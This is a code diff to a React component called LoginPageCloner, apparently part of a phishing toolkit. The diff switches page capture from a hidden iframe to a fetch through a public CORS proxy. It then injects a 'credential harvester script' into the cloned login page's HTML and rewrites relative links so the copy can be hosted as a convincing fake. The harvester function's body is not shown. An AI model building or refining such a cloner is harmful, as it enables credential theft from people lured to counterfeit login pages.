@@ -1,7 +1,7 @@
 
 'use client';
 
-import { useState, useRef } from 'react';
+import { useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
 import { z } from 'zod';
@@ -77,7 +77,6 @@ export function LoginPageCloner() {
   const [isHosting, setIsHosting] = useState(false);
   
   const [clonerError, setClonerError] = useState<string | null>(null);
-  const iframeRef = useRef<HTMLIFrameElement>(null);
 
   const form = useForm<z.infer<typeof pageClonerSchema>>({
     resolver: zodResolver(pageClonerSchema),
@@ -97,53 +96,40 @@ export function LoginPageCloner() {
   const onClonerSubmit = async (values: z.infer<typeof pageClonerSchema>) => {
     setIsCloning(true);
     resetState();
-    toast({ title: "Cloning page...", description: "This may take a moment. Ensure the target site allows framing." });
+    toast({ title: "Cloning page...", description: "Fetching content via proxy..." });
 
-    const iframe = iframeRef.current;
-    if (!iframe) return;
-    
-    // Use a proxy to bypass CORS issues. In a real app, this would be a self-hosted proxy.
     const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(values.targetUrl)}`;
     
-    iframe.src = proxyUrl;
-    
-    const timeout = setTimeout(() => {
-        setIsCloning(false);
-        setClonerError("Cloning timed out. The target website may be blocking this request. Try another URL.");
-        toast({ variant: 'destructive', title: 'Cloning Failed', description: 'The operation timed out.' });
-    }, 15000); // 15-second timeout
+    try {
+      const response = await fetch(proxyUrl);
+      if (!response.ok) {
+        throw new Error(`Failed to fetch page. Status: ${response.status}`);
+      }
+      
+      let html = await response.text();
+      
+      const harvesterScript = getHarvesterScript(values.redirectUrl);
+      
+      // Inject the credential harvester script before the closing body tag
+      if (html.includes('</body>')) {
+        html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
+      } else {
+        html += harvesterScript;
+      }
 
-    iframe.onload = async () => {
-        clearTimeout(timeout);
-        try {
-            const html = iframe.contentWindow?.document.documentElement.outerHTML;
-            if (html && !html.includes("request blocked")) {
-                const harvesterScript = getHarvesterScript(values.redirectUrl);
-                let finalHtml = html;
-                 // Inject the credential harvester script before the closing body tag
-                if (finalHtml.includes('</body>')) {
-                  finalHtml = finalHtml.replace(/<\/body>/i, `${harvesterScript}</body>`);
-                } else {
-                  finalHtml = finalHtml + harvesterScript;
-                }
-                setClonedHtml(finalHtml);
-                toast({ title: "Page Cloned Successfully", description: "A static copy of the page has been created." });
-            } else {
-                 setClonerError("Failed to clone. The website might be using anti-framing headers (X-Frame-Options) or the CORS proxy may have been blocked.");
-            }
-        } catch (e) {
-            console.error("Cloning error:", e);
-            setClonerError("A security error occurred while trying to access the page content. The target website is likely protected against this type of cloning.");
-        } finally {
-            setIsCloning(false);
-        }
-    };
-    
-    iframe.onerror = () => {
-        clearTimeout(timeout);
-        setIsCloning(false);
-        setClonerError("Failed to load the target URL in the cloning frame.");
-    };
+      // Rewrite relative URLs to absolute URLs
+      html = html.replace(/(src|href)=["'](\/[^/])/g, `$1="${new URL(values.targetUrl).origin}$2"`);
+
+      setClonedHtml(html);
+      toast({ title: "Page Cloned Successfully", description: "A static copy of the page has been created." });
+
+    } catch (e) {
+      const errorMessage = e instanceof Error ? e.message : "An unknown error occurred.";
+      console.error("Cloning error:", e);
+      setClonerError(`Failed to clone. The CORS proxy may be blocked or the target URL is invalid. Details: ${errorMessage}`);
+    } finally {
+      setIsCloning(false);
+    }
   };
 
   const handleHostPage = async () => {
@@ -196,7 +182,6 @@ export function LoginPageCloner() {
   
   return (
     <>
-      <iframe ref={iframeRef} sandbox="allow-scripts allow-same-origin" className="hidden" title="cloner"></iframe>
       <div className="grid lg:grid-cols-5 gap-6">
         <div className="lg:col-span-2 space-y-6">
           <Card>
